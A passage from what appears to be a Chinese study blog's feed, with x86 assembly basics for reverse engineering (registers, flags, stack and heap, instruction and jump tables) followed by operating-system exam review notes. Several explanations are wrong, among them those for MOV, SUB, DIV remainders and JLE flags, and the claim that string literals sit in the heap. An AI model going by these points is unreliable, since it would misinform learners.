-&gt; ‘counter’(计数器)：</li><li>DX -&gt; ‘data’(数据寄存器)：大多数情况下用来存放数据</li><li>DI -&gt; ‘destination index’(目的变址寄存器): 例如将一个字符串拷贝到DI</li><li>SI -&gt; ‘source index’(源变址寄存器): 例如将一个字符串从SI拷贝</li></ol></blockquote><p>2.索引寄存器（指针寄存器）:</p><blockquote><ol><li>BP -&gt; ‘base pointer’(基址指针寄存器)：表示栈区域的基地址</li><li>SP -&gt; ‘stack pointer’(栈指针寄存器)：表示栈区域的栈顶地址</li></ol></blockquote><p>3.段寄存器：</p><blockquote><ol><li>CS -&gt; ‘code segment’(代码段寄存器)：用于存放应用程序代码所在段的段基址(之后会说明)</li><li>DS -&gt; ‘data segment’(数据段寄存器)：用于存放数据段的段基址(以后会说明)</li><li>ES -&gt; ‘extra segment’(附加段寄存器)：用于存放程序使用的附加数据段的基地址</li><li>SS -&gt; ‘stack segment’(栈段寄存器)：用于存放栈段的段基址(以后会说明)</li></ol></blockquote><p>4.指令指针寄存器：</p><blockquote><p>IP -&gt; ‘instruction pointer’(指令指针寄存器)：指向下一个指令 ;)</p></blockquote><p>iii. 双字(32位)寄存器：</p><p>2 字= 4 字节= 32 位， EAX、EBX、ECX、EDX、EDI…… </p><p>如果16位寄存器前面加了‘E’，就代表它们是32位寄存器。例如，AX=16位，EAX=32位。</p><h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><p>32位的CPU中有32个不同的标志寄存器，只关心期中三个：ZF、OF、CF。标志寄存器是一个标志，==只能是0或者1，决定了是否要执行某个指令==，可以知道程序在这一步是否会跳转。</p><h3 id="Z-Flag（零标志）"><a href="#Z-Flag（零标志）" class="headerlink" title="Z-Flag（零标志）"></a>Z-Flag（零标志）</h3><p>ZF是破解中用的最多的寄存器（通常90%）。若上一个运算结果为0，则值为1，否则为0。</p><h3 id="The-O-Flag（溢出标志）"><a href="#The-O-Flag（溢出标志）" class="headerlink" title="The O-Flag（溢出标志）"></a>The O-Flag（溢出标志）</h3><p>OF占约4%，若上一步改变了某寄存器的最高有效位，则会被设置为1。操作产生溢出时也会被设置为1。</p><h3 id="The-C-Flag（进位标志）"><a href="#The-C-Flag（进位标志）" class="headerlink" title="The C-Flag（进位标志）"></a>The C-Flag（进位标志）</h3><p>CF占1%，产生溢出，就会被设置为1。</p><h2 id="段偏移"><a href="#段偏移" class="headerlink" title="段偏移"></a>段偏移</h2><p>内存中的一个段储存了指令（CS）、数据（DS）、堆栈（SS）或者其他段（ES）。每一个段都有一个偏移量，在32位应用程序下，这些偏移量由00000000到FFFFFFFF。段和偏移量的标准形式如下：</p><blockquote><p>段：偏移量 = 把它们放在一起就是内存中一个具体的地址。</p><p>比喻：一个段是一本书的某一页；偏移量是一页的某一行。</p></blockquote><h2 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h2><p><strong>内存中的栈区处于相对较高的地址以地址的增长方向为上的话，栈地址是向下增长的。</strong></p><p>栈中分配局部变量空间，堆区是向上增长的用于分配程序员申请的内存空间。另外还有静态区是分配静态变量，全局变量空间的；只读区是分配常量和程序代码空间的；以及其他一些分区。</p><blockquote><p>PUSH 命令是向栈中压入数据，POP命令就是从栈中取出最后放入的数据并且把它存进具体的寄存器中。</p></blockquote><h3 id="1、堆和栈申请和回收方式不同"><a href="#1、堆和栈申请和回收方式不同" class="headerlink" title="1、堆和栈申请和回收方式不同"></a>1、堆和栈申请和回收方式不同</h3><ul><li>栈：由系统自动分配空间，自动回收</li><li>堆：由程序员自己申请空间，不释放就可以一直访问</li></ul><h3 id="2、申请后系统响应"><a href="#2、申请后系统响应" class="headerlink" title="2、申请后系统响应"></a>2、申请后系统响应</h3><ul><li>栈：只要栈剩余空间,就自动分配空间，否则提示栈溢出</li><li>堆：==操作系统有一个记录空闲内存地址的链表==，系统收到空间申请会遍历该链表，寻找第一个大于申请空间的结点。并将结点从空闲结点链表删除，将空间分配给程序。==在这块内存空间的首地址会记录分配空间的大小，所以delete才能正确释放空间。==多余空间会放回空闲链表。 </li></ul><h3 id="3、堆申请效率比栈低"><a href="#3、堆申请效率比栈低" class="headerlink" title="3、堆申请效率比栈低"></a>3、堆申请效率比栈低</h3><h3 id="4、申请大小的限制"><a href="#4、申请大小的限制" class="headerlink" title="4、申请大小的限制"></a>4、申请大小的限制</h3><ul><li>栈：Win下，栈是==连续的内存区域==，==向低地址扩展的数据结构。栈顶地址和栈的最大容量是系统预先规定好的。==Win下栈大小为1M，申请空间超出剩余会提示overflow。</li><li>堆：向高地址拓展的数据结构，不连续的内存区域。（因为用链表储存）<strong>链表遍历从低地址到高地址。</strong>堆的大小受限于计算机系统中有效的虚拟内存。</li></ul><h3 id="5、堆和栈中的存储内容"><a href="#5、堆和栈中的存储内容" class="headerlink" title="5、堆和栈中的存储内容"></a>5、堆和栈中的存储内容</h3><ul><li>栈大小有限，用子函数有物理意义（？？？）</li><li>栈：调用函数时，第一个进栈的是主函数中函数调用后的下一条指令（下一条可执行语句）==的地址==，然后是函数的各个参数，在大多数C编译器中，参数是由右往左入栈的，然后是函数中的局部变量。==静态变量不入栈。==</li></ul><p>==调用结束后，局部变量先出栈，然后是参数，最后栈顶指向最开始存的地址，也就是主函数中的下一条指令，程序由该点继续运行==</p><ul><li>堆:一般是在堆的头部用一个字节存放堆的大小。堆中具体内容由程序员安排。</li></ul><h3 id="6、存取效率的比较"><a href="#6、存取效率的比较" class="headerlink" title="6、存取效率的比较"></a>6、存取效率的比较</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">char</span> s1[] = <span class="hljs-string">&quot;aaaaaaaaaaaaaaa&quot;</span>; <br><span class="hljs-keyword">char</span> *s2 = <span class="hljs-string">&quot;bbbbbbbbbbbbbbbbb&quot;</span>; <br></code></pre></td></tr></table></figure><p>aaaaaaaaaaa是在运行时刻赋值的；（字符数组有连续空间存放值）放在栈中。<br>而bbbbbbbbbbb是在编译时就确定的；（只有4字节的空间用于存放地址）放在堆中。<br>==在以后的存取中，在栈上的数组比指针所指向的字符串(例如堆)快==</p><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>==所有值通常以16进制形式储存的。==</p><p>大部分指令有两个操作符（例如add EAX,EBX）,有些是一个（例如not EAX），还有一些是三个操作符（例如IMUL EAX，EDX，64）。如果使用“DWORD PTR [XXX]”就表示使用了内存中偏移量为XXX的数据。<strong>Win+Intel的电脑大多采用“低尾端法”，所以字节在内存中储存方式是倒过来的。</strong></p><blockquote><p>大部分有两个操作符的指令都是以下这种格式（以add举例）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">ebx</span>                           寄存器, 寄存器<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>,<span class="hljs-number">123</span>                           寄存器, 数值<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-number">404000</span>]            寄存器, <span class="hljs-built_in">Dword</span>  指针 [数值]<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>]               寄存器, <span class="hljs-built_in">Dword</span>  指针 [寄存器值]<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>+<span class="hljs-number">00404000</span>]      寄存器, <span class="hljs-built_in">Dword</span>  指针 [寄存器值+数值]<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-number">404000</span>],<span class="hljs-built_in">eax</span>            <span class="hljs-built_in">Dword</span> 指针[数值], 寄存器<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-number">404000</span>],<span class="hljs-number">123</span>            <span class="hljs-built_in">Dword</span> 指针[数值], 数值<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>],<span class="hljs-built_in">eax</span>               <span class="hljs-built_in">Dword</span> 指针[寄存器值], 寄存器<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>],<span class="hljs-number">123</span>               <span class="hljs-built_in">Dword</span> 指针[寄存器值], 数值<br>&gt;<span class="hljs-keyword">add</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>+<span class="hljs-number">404000</span>],<span class="hljs-built_in">eax</span>        <span class="hljs-built_in">Dword</span> 指针[寄存器值+数值], 寄存器<span class="hljs-keyword">add</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>+<span class="hljs-number">404000</span>],<span class="hljs-number">123</span>        <span class="hljs-built_in">Dword</span> 指针[寄存器值+数值], 数值<br></code></pre></td></tr></table></figure></blockquote><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>ADD 被加数，加数</p><p>将一个数值加在一个寄存器上或者一个内存地址上。</p><p>add eax,123 == eax = eax +123</p><p>加法指令对ZF，OF，CF都有影响</p><h3 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h3><p>AND 目标数，原数</p><p>AND运算对两个数进行逻辑与运算。</p><p>会清空OF,CF标记，设置ZF标记。</p><h3 id="CALL"><a href="#CALL" class="headerlink" title="CALL"></a>CALL</h3><blockquote><p>CALL 404000                 最常见: CALL 地址<br>CALL EAX                    CALL 寄存器 - 如果寄存器存的值为404000，那就等同于第一种情况<br>CALL DWORD PTR [EAX]        CALL [EAX]偏移量所指向的地址<br>CALL DWORD PTR [EAX+5]      CALL [EAX+5]偏移量所指向的地址</p></blockquote><h3 id="CDQ"><a href="#CDQ" class="headerlink" title="==CDQ=="></a>==CDQ==</h3><p>通常出现在除法前面，将EDX的所有位变成EAX最高位的值</p><p>比如当EAX&gt;=80000000h时，其二进制最高位为1，则EDX被32位全赋值为1，即FFFFFFFF</p><p>若EAX&lt;80000000，则其二进制最高位为0，EDX为00000000。</p><p>然后将EDX：EAX组成新数(64位)：FFFFFFFF 80000000</p><h3 id="CMP（compare）"><a href="#CMP（compare）" class="headerlink" title="CMP（compare）"></a>CMP（compare）</h3><p>CMP 目标数，原数</p><p>比较两个值并且标记CF、OF、ZF:</p><blockquote><p>CMP     EAX, EBX               比较eax和ebx是否相等，如果相等就设置ZF为1<br>CMP     EAX,[404000]           比较eax和偏移量为[404000]的值是否相等<br>CMP     [404000],EAX           比较[404000]是否与eax相等</p></blockquote><h3 id="DEC-decrease"><a href="#DEC-decrease" class="headerlink" title="DEC(decrease)"></a>DEC(decrease)</h3><p>DEC something</p><p>自减</p><blockquote><p>dec eax                              eax自减1<br>dec [eax]                            偏移量为eax的值自减1<br>dec [401000]                         偏移量为401000的值自减1<br>dec [eax+401000]                     偏移量为eax+401000的值自减1</p></blockquote><p>可以标记ZF、OF</p><h3 id="DIV（division除）"><a href="#DIV（division除）" class="headerlink" title="DIV（division除）"></a>DIV（division除）</h3><p>DIV 除数</p><p>无符号除法</p><p>DIV指令用来将EAX除以除数（无符号除法），被除数通常是EAX，结果也储存在EAX中，而被除数对除数取的模存在除数中。</p><blockquote><p>mov eax,64                       EAX = 64h = 100<br>mov ecx,9                        ECX = 9<br>div ecx                          EAX除以ECX</p></blockquote><p>EAX = 100/9 = 0B(11)并且ECX = 100 MOD 9 = 1</p><p>可以标记CF、OF、ZF</p><h3 id="IDIV（整除）"><a href="#IDIV（整除）" class="headerlink" title="IDIV（整除）"></a>IDIV（整除）</h3><p>IDIV 除数</p><p>有符号除法</p><p>执行方法同div一样</p><h3 id="INC（increase）"><a href="#INC（increase）" class="headerlink" title="INC（increase）"></a>INC（increase）</h3><p>自加</p><p>可以标记ZF、OF</p><p><strong>INT</strong></p><p>语法: int 目标数</p><p>INT 的目标数必须是产生一个整数(例如：int 21h)，类似于call调用函数，INT指令是调用程序对硬件控制，不同的值对应着不同的功能。</p><p>具体参照硬件说明书。</p><p><strong>JUMPS</strong></p><p>这些都是最重要的跳转指令和触发条件(重要用<em>标记，最重要用*</em>标记)：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros">指令                条件                    条件<br>JA*          -    如果大于就跳转(无符号)      - <span class="hljs-attribute">CF</span>=0 <span class="hljs-keyword">and</span> <span class="hljs-attribute">ZF</span>=0<br>JAE          -    如果大于或等于就跳转(无符号)- <span class="hljs-attribute">CF</span>=0<br>JB*          -    如果小于就跳转(无符号)   - <span class="hljs-attribute">CF</span>=1<br>JBE          -    如果小于或等于就跳转(无符号)- <span class="hljs-attribute">CF</span>=1 <span class="hljs-keyword">or</span> <span class="hljs-attribute">ZF</span>=1<br>JC           -    如果CF被标记就了跳转       - <span class="hljs-attribute">CF</span>=1<br>JCXZ         -    如果CX等于0就跳转      - <span class="hljs-attribute">CX</span>=0<br>JE**         -    如果相等就跳转        - <span class="hljs-attribute">ZF</span>=1<br>JECXZ        -    如果ECX等于0就跳转       - <span class="hljs-attribute">ECX</span>=0<br>JG*          -    如果大于就跳转(有符号)   - <span class="hljs-attribute">ZF</span>=0 <span class="hljs-keyword">and</span> <span class="hljs-attribute">SF</span>=OF (SF = Sign Flag)<br>JGE*         -    如果大于或等于就跳转(有符号) - <span class="hljs-attribute">SF</span>=OF<br>JL*          -    如果小于就跳转(有符号)    - SF != OF (!= is <span class="hljs-keyword">not</span>)<br>JLE*         -    如果小于或等于就跳转(有符号 - <span class="hljs-attribute">ZF</span>=1 <span class="hljs-keyword">and</span> OF != OF<br>JMP**        -    跳转             - 强制跳转<br>JNA          -    如果不大于就跳转(无符号)   - <span class="hljs-attribute">CF</span>=1 <span class="hljs-keyword">or</span> <span class="hljs-attribute">ZF</span>=1<br>JNAE         -    如果不大于等于就跳转(无符号) - <span class="hljs-attribute">CF</span>=1<br>JNB          -    如果不小于就跳转(无符号)   - <span class="hljs-attribute">CF</span>=0<br>JNBE         -    如果不小于等于就跳转(无符号) - <span class="hljs-attribute">CF</span>=0 <span class="hljs-keyword">and</span> <span class="hljs-attribute">ZF</span>=0<br>JNC          -    如果CF未被标记就跳转     - <span class="hljs-attribute">CF</span>=0<br>JNE**        -    如果不等于就跳转       - <span class="hljs-attribute">ZF</span>=0<br>JNG          -    如果不大于就跳转(有符号)   - <span class="hljs-attribute">ZF</span>=1 <span class="hljs-keyword">or</span> SF!=OF<br>JNGE         -    如果不大于等于就跳转(有符号) - SF!=OF<br>JNL          -    如果不小于就跳转(有符号)   - <span class="hljs-attribute">SF</span>=OF<br>JNLE         -    如果不小于等于就跳转(有符号) - <span class="hljs-attribute">ZF</span>=0 <span class="hljs-keyword">and</span> <span class="hljs-attribute">SF</span>=OF<br>JNO          -    如果OF未被标记就跳转     - <span class="hljs-attribute">OF</span>=0<br>JNP          -    如果PF未被标记就跳转     - <span class="hljs-attribute">PF</span>=0<br>JNS          -    如果SF未被标记就跳转      - <span class="hljs-attribute">SF</span>=0<br>JNZ          -    如果不等于0就跳转      - <span class="hljs-attribute">ZF</span>=0<br>JO           -    如果OF被标记就跳转     - <span class="hljs-attribute">OF</span>=1<br>JP           -    如果PF被标记就跳转     - <span class="hljs-attribute">PF</span>=1<br>JPE          -    如果是偶数就跳转       - <span class="hljs-attribute">PF</span>=1<br>JPO          -    如果是奇数就跳转       - <span class="hljs-attribute">PF</span>=0<br>JS           -    如果SF被标记就跳转     - <span class="hljs-attribute">SF</span>=1<br>JZ           -    如果等于0就跳转      - <span class="hljs-attribute">ZF</span>=1<br></code></pre></td></tr></table></figure><p><strong>LEA (有效地址传送)</strong></p><p>语法：LEA 目的数、源数</p><p>LEA可以看成和MOV差不多的指令LEA ，它本身的功能并没有被太广泛的使用，反而广泛运用在快速乘法中：</p><p>lea eax，dword ptr [4*ecx+ebx]</p><p>将eax赋值为 4*ecx+ebx</p><p><strong>MOV (传送)</strong></p><p>语法: MOV 目的数,源数</p><p>这是一个很简单的指令，MOV指令将源数赋值给目的数，并且源数值保持不变</p><p>这里有一些MOV的变形：</p><p>MOVS/MOVSB/MOVSW/MOVSD EDI, ESI：这些变形能将ESI指向的内容传送到EDI指向的内容中去</p><p>MOVSX：MOVSX指令将单字或者单字节扩展为双字或者双字节传送，原符号不变</p><p>MOVZX：MOVZX扩展单字节或单字为双字节或双字并且用0填充剩余部分(通俗来说就是将源数取出置于目的数，其他位用0填充)</p><p><strong>MUL (multiply乘法)</strong></p><p>语法：MUL 数值</p><p>这个指令同IMUL一样，不过MUL可以乘无符号数。</p><p><strong>NOP (无操作)</strong></p><p>语法：NOP</p><p>这个指令说明不做任何事</p><p>所以它在逆向中运用范围最广</p><p><strong>OR (逻辑或)</strong></p><p>语法：OR 目的数,源数</p><p>OR指令对两个值进行逻辑或运算</p><p>这个指令会清空OF、CF标记，设置ZF标记</p><p>为了更好的理解OR，思考下面二进制串:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">10010101100101001101<br></code></pre></td></tr></table></figure><p>如果对它们进行逻辑与运算，结果将是1101011111。</p><p>只有当两边同为0时其结果为0，否则就为1。你可以用计算器尝试计算。希望你能理解为什么，最好自己动手算一算</p><p><strong>POP</strong></p><p>语法：POP 目的地址</p><p>POP指令将栈顶第一个字传送到目的地址。 每次POP后，ESP(栈指针寄存器)都会增加以指向新栈顶</p><p><strong>PUSH</strong></p><p>语法：PUSH 值</p><p>PUSH是POP的相反操作，它将一个值压入栈并且减小栈顶指针值以指向新栈顶。</p><p><strong>REP/REPE/REPZ/REPNE/REPNZ</strong></p><p>语法: REP/REPE/REPZ/REPNE/REPNZ ins</p><p>重复上面的指令：直到CX=0。ins必须是一个操作符，比如CMPS、INS、LODS、MOVS、OUTS、SCAS 或 STOS</p><p><strong>RET (return返回)</strong></p><p>语法：RET</p><p>RET digit</p><p>RET指令的功能是从一个代码区域中退出到调用CALL的指令处。</p><p>RET digit在返回前会清理栈</p><p><strong>SUB (减)</strong></p><p>语法：SUB 目的数,源数</p><p>SUB与ADD相反，它将源数减去目的数，并将结果储存在目的数中</p><p>SUB可以标记ZF、OF、CF</p><p><strong>TEST</strong></p><p>语法：TEST 操作符、操作符</p><p>这个指令99%都是用于”TEST EAX, EAX”，它执行与AND相同的功能，但是并不储存数据。如果EAX=0就会标记ZF，如果EAX不是0，就会清空ZF</p><p><strong>XOR</strong></p><p>语法：XOR 目的数,源数</p><p>XOR指令对两个数进行异或操作</p><p>这个指令清空OF、CF，但会标记ZF</p><p>为了更好的理解，思考下面的二进制串：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1001010110</span><br><span class="hljs-number">0101001101</span><br></code></pre></td></tr></table></figure><p>如果异或它们，结果将是1100011011</p><p>如果两个值相等，则结果为0，否则为1。</p><p>很多情况下我们会使用”XOR EAX, EAX”，这个操作是将EAX赋值为0，因为当一个值异或其自身，就过都是0。你最好自己动手尝试下，这样可以帮助你理解得更好</p><h3 id="MOV"><a href="#MOV" class="headerlink" title="MOV"></a>MOV</h3><p>MOV AX , 2000H 将AX传给2000H</p><h3 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a>逻辑操作符</h3><img src="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/Snipaste_2019-08-12_22-36-43.jpg" class="" title="Snipaste_2019-08-12_22-36-43"><h2 id="MIPS汇编"><a href="#MIPS汇编" class="headerlink" title="MIPS汇编"></a>MIPS汇编</h2><p><a href="https://www.cnblogs.com/thoupin/p/4018455.html">link</a></p><p>xori 异或</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>操作系统复习</title>
    <link href="/2020/01/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/"/>
    <url>/2020/01/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="对不起我看吐了，考炸了"><a href="#对不起我看吐了，考炸了" class="headerlink" title="对不起我看吐了，考炸了"></a><strong>对不起我看吐了，考炸了</strong></h2><h2 id="操作系统的目标"><a href="#操作系统的目标" class="headerlink" title="操作系统的目标"></a>操作系统的目标</h2><p><strong>方便性，有效性，可扩充性和开放性</strong></p><p>可扩充性：采用微内核结构 P30</p><h3 id="发展主要动力"><a href="#发展主要动力" class="headerlink" title="发展主要动力"></a>发展主要动力</h3><ul><li>不断提高计算机资源利用率</li><li>方便用户</li><li>器件的更新换代</li><li>体系结构的发展</li><li>新的应用需求</li></ul><h3 id="多道程序设计的基本概念"><a href="#多道程序设计的基本概念" class="headerlink" title="多道程序设计的基本概念"></a>多道程序设计的基本概念</h3><p>利用I/O操作的空闲时间，调度B程序运行，B空闲调度C等    P8</p><h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h4><ul><li>资源利用率高</li><li>吞吐量大</li><li>平均周转时间长</li><li>没有交互能力</li></ul><p>==操作系统定义为:一组能有效组织和管理硬件和软件资源，合理进行调度，方便用户使用程序的集合==</p><h3 id="分时系统（The-Sharing-System）"><a href="#分时系统（The-Sharing-System）" class="headerlink" title="分时系统（The Sharing System）"></a>分时系统（The Sharing System）</h3><p>在一台主机上连接多个终端，允许多个用户同时通过终端以交互方式使用计算机，共享主机资源</p><h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><ul><li>多路性</li><li>独立性</li><li>及时性</li><li>交互性</li></ul><h2 id="基本特性"><a href="#基本特性" class="headerlink" title="基本特性"></a>基本特性</h2><p><strong>有并发，共享，虚拟，异步四个基本特征</strong></p><h3 id="并行与并发"><a href="#并行与并发" class="headerlink" title="并行与并发"></a>并行与并发</h3><p>并行：多个程序同时执行</p><p>并发：分时交替执行（为主）</p><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p>指在系统中可以独立运行并且是资源分配的基本单元</p><h3 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h3><p>互斥共享方式和同时访问方式</p><h3 id="虚拟"><a href="#虚拟" class="headerlink" title="虚拟"></a>虚拟</h3><p>（没有那么多但感觉有那么多）</p><ul><li>时分复用技术    （空闲时给其他用户服务</li><li>空分复用技术    （储存器空闲时存储和运行程序</li></ul><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><p>（同时开始，不同时结束）</p><p>进程以不可预知的速度进行</p><h2 id="存储器管理功能"><a href="#存储器管理功能" class="headerlink" title="存储器管理功能"></a>存储器管理功能</h2><ul><li>内存分配</li><li>内存保护</li><li>地址映射</li><li>内存扩充</li></ul><h2 id="OS结构设计"><a href="#OS结构设计" class="headerlink" title="OS结构设计"></a>OS结构设计</h2><p>第一代无结构OS，第二代模块化OS，第三代分层式OS</p><h2 id="进程-1"><a href="#进程-1" class="headerlink" title="进程"></a>进程</h2><p>PCB进程控制块（Process Control Block）</p><p>定义：</p><ul><li>进程的程序的一次执行</li><li>进程是一个程序及其数据 顺序执行的活动</li><li>进程是系统进行资源分配的独立单元</li></ul><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ul><li>动态性</li><li>并发性</li><li>独立性</li><li>异步性</li></ul><h2 id="进程状态转换"><a href="#进程状态转换" class="headerlink" title="进程状态转换"></a>进程状态转换</h2><p>==P42-43==</p><h2 id="操作系统内核"><a href="#操作系统内核" class="headerlink" title="操作系统内核"></a>操作系统内核</h2><p>处理机两种执行状态：系统态和用户态</p><h2 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h2><h3 id="临界资源-生产者消费者问题"><a href="#临界资源-生产者消费者问题" class="headerlink" title="临界资源-生产者消费者问题"></a>临界资源-生产者消费者问题</h3><h3 id="设置临界区"><a href="#设置临界区" class="headerlink" title="设置临界区"></a>设置临界区</h3><ul><li>进入区 判断资源是否被访问</li><li>临界区</li><li>退出区 将正被访问标志恢复为未被访问</li><li>剩余区</li></ul><h3 id="同步规则"><a href="#同步规则" class="headerlink" title="同步规则"></a>同步规则</h3><ul><li>空闲让进</li><li>忙则等待</li><li>有限等待 有限时间内能访问</li><li>让权等待 不能进入则释放处理机</li></ul><h2 id="利用信号量实现进程互斥"><a href="#利用信号量实现进程互斥" class="headerlink" title="利用信号量实现进程互斥"></a>利用信号量实现进程互斥</h2><p>设mutex为互斥信号量，=1都未进入临界区，=0有一个进入运行，另一阻塞。= -1有一正在运行，另一等待。</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>调度和分派的基本单位，能独立运行的基本单位</p><p>切换时仅保存和设置少量寄存器内容，切换代价远低于进程</p><h2 id="处理机调度层次"><a href="#处理机调度层次" class="headerlink" title="处理机调度层次"></a>处理机调度层次</h2><h3 id="高级调度"><a href="#高级调度" class="headerlink" title="高级调度"></a>高级调度</h3><p>调度对象是作业，多用于多道批处理</p><h3 id="低级调度"><a href="#低级调度" class="headerlink" title="低级调度"></a>低级调度</h3><p>决定就绪队列哪个进程获得处理机</p><h3 id="中级调度"><a href="#中级调度" class="headerlink" title="中级调度"></a>中级调度</h3><p>提高内存利用率和系统吞吐量（把暂时不运行的进程调至外存，此时进程状态为就绪/挂起状态）</p><h2 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h2><h3 id="CPU利用率"><a href="#CPU利用率" class="headerlink" title="CPU利用率"></a>CPU利用率</h3><p>CPU利用率 = CPU有效工作时间/(CPU有效工作时间 + CPU空闲等待时间)</p><h3 id="平均周转时间"><a href="#平均周转时间" class="headerlink" title="平均周转时间"></a>平均周转时间</h3><p>T = 1/n(T1+T2 ······ +Tn)</p><h3 id="平均带权周转时间"><a href="#平均带权周转时间" class="headerlink" title="平均带权周转时间"></a>平均带权周转时间</h3><p>W = 1/n(作业周转时间Ti/提供服务Ts + ······ ) i=1,2,3,4…..</p><h3 id="系统吞吐量大"><a href="#系统吞吐量大" class="headerlink" title="系统吞吐量大"></a>系统吞吐量大</h3><p>与作业平均长度有关，单纯提高吞吐量可选择多的短作业运行</p><h2 id="分时系统目标"><a href="#分时系统目标" class="headerlink" title="分时系统目标"></a>分时系统目标</h2><ul><li>响应时间快</li><li>均衡性（相应快慢和请求的复杂性相适应）</li></ul><h2 id="实时系统目标"><a href="#实时系统目标" class="headerlink" title="实时系统目标"></a>实时系统目标</h2><ul><li>截止时间的保证</li><li>可预测性</li></ul><h2 id="作业调度算法"><a href="#作业调度算法" class="headerlink" title="作业调度算法"></a>作业调度算法</h2><h3 id="FCFS（First-Come-First-Server）先来先服务"><a href="#FCFS（First-Come-First-Server）先来先服务" class="headerlink" title="FCFS（First Come First Server）先来先服务"></a>FCFS（First Come First Server）先来先服务</h3><h3 id="SJF-Short-Job-First-短作业优先"><a href="#SJF-Short-Job-First-短作业优先" class="headerlink" title="SJF (Short Job First) 短作业优先"></a>SJF (Short Job First) 短作业优先</h3><h3 id="PSA-Priority-Scheduling-Algorithm-优先级调度算法"><a href="#PSA-Priority-Scheduling-Algorithm-优先级调度算法" class="headerlink" title="PSA (Priority-Scheduling Algorithm) 优先级调度算法"></a>PSA (Priority-Scheduling Algorithm) 优先级调度算法</h3><p>基于作业紧迫程度</p><h3 id="HRRN-Highest-Response-Ratio-Next-高响应比优先调度算法"><a href="#HRRN-Highest-Response-Ratio-Next-高响应比优先调度算法" class="headerlink" title="HRRN (Highest Response Ratio Next) 高响应比优先调度算法"></a>HRRN (Highest Response Ratio Next) 高响应比优先调度算法</h3><p>优先权 = (等待时间 + 要求服务时间) / 要求服务时间</p><h3 id="RR-Round-Robin-基于时间片的轮转调度算法"><a href="#RR-Round-Robin-基于时间片的轮转调度算法" class="headerlink" title="RR ( Round Robin) 基于时间片的轮转调度算法"></a>RR ( Round Robin) 基于时间片的轮转调度算法</h3><h3 